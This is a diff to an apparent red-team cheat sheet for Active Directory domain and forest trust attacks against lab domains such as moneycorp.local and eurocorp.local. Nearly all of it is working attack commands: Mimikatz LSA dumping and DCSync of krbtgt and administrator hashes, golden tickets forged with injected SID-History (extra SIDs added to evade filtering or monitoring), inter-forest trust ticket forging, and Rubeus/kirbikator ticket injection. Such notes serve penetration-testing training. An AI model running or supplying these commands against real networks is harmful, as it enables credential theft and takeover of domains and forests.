@@ -1283,41 +1283,56 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 # Get the TGS from child domain pushing the SID-HIstory and user over-pass-the-hash
 # The parent  domain will trust the ticket even if it is created in the child domain
 # No need to use other 
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:<hash> /ptt" "exit"
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local> /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:<hash> /ptt" "exit"
 
 # Access  
 gwmi -class win32_operatingsystem -ComputerName mcorp-dc.corporate.local
 
 # Dcsync across domain
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\administrator /domain:moneycorp.local"'
 
+# Additional notet on SID History (https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/) 
+# In some complex contexts (filtering/monitoring between domains) it can help to add some extra SIDs
+# forest root Domain controllers (forest_root_SID-516)
+# Enterprise Domain controller (S-1-5-9)
+Invoke-Mimikatz -Command '"kerberos::golden /user:dcorp-dc$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /groups:516 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:<hash> /ptt" "exit"
 ```
-**Example:**
-
-![Main Logo](images/Example_Child_to_parent01.PNG 'Example04')
 
 ### Across Forest using Trust Tickets
 
-**1. Request the trust key for the inter forest trust:**
 ```powershell
-# request the trust key for the inter forest trust
-Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.corp.corporate.local      
-```
-**2. Create the inter-realm TGT:**
-```powershell
-# Create the inter-realm TGT
-Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<domain> /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:<hash> /service:krbtgt /target:eurocorp.local /ticket:C:\test\kekeo_old\trust_forest_tkt.kirbi"'
-```
-**3. Get a TGS for a service (CIFS below) in the target domain by using the
-forged trust ticket:**
-```powershell
-# Get a TGS for a service
+# Forest is considered to be a Security Boundary
+# Injecting a SID-History for target "Enterprise admins" group doesn't work because
+# There is a SID Filtering between two forest that remove the RIDs beetween 500 and 1000 from the SID-History (so it's not possible to fake privileged identity into another forest)
+
+# However it's possible to resources shared from the target forest to the source forest (standard shares, but no c$ and administrative shares)
+
+# Request the trust key for the inter forest trust
+Invoke-Mimikatz -Command '"lsadump::trust /patch"'
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' 
+
+# Forge a Golden ticket with source moneycorp.local and target eurocorp.local
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:<hash> /service:krbtgt /target:eurocorp.local /ticket:C:\test\kekeo_old\trust_forest_tkt.kirbi"'
+
+# Then request TGS for CIFS service in the other forest and iject with kirbikator
 .\asktgs.exe C:\test\trust_forest_tkt.kirbi CIFS/eurocorp-dc.corporate.local
-```
-**4. Present the TGS to the service (CIFS) in the target forest:**
-```powershell
-# Present the TGS
 .\kirbikator.exe lsa .\CIFS.eurocorp-dc.corporate.local.kirbi
+
+# Alternative with Rubeus
+Rubeus.exe asktgs /ticket:C:\test\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorpm-dc.eurocorp.local /ptt
+
+# Profit (only resources specifially shared to the source forest: access to C$ is not permitted)
+ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp
+
+# The question is now: how to enumerate resources?
+# - enmeration from a non privileged user on the target forest is always possible
+# - enumerate machines in the target forest
+# - request a TGS for CIFS for each one machine
+# - use "net view" command for each machine
+
+# DCSync is not possible, unless there is a non privileged user that has Replication rights
+
 ```
 
 ### GenericAll Abused
